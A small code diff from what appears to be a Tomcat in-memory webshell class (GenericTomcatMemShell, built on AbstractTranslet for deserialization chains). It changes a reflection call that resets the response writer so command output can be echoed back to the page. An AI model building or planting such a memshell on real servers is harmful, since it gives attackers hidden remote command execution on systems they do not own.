@@ -54,7 +54,7 @@ public class GenericTomcatMemShell extends AbstractTranslet {
                 Field responseField = ResponseFacade.class.getDeclaredField("response");//修改usingwriter，让页面可以写正常内容以及命令回显
                 responseField.setAccessible(true);
                 Response response = (Response) responseField.get(responseFacade);
-                Field usingWriter = Response.class.getDeclaredField("usingWriter");
+                Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredField("usingWriter");
                 usingWriter.setAccessible(true);
                 usingWriter.set(response, Boolean.FALSE);
 
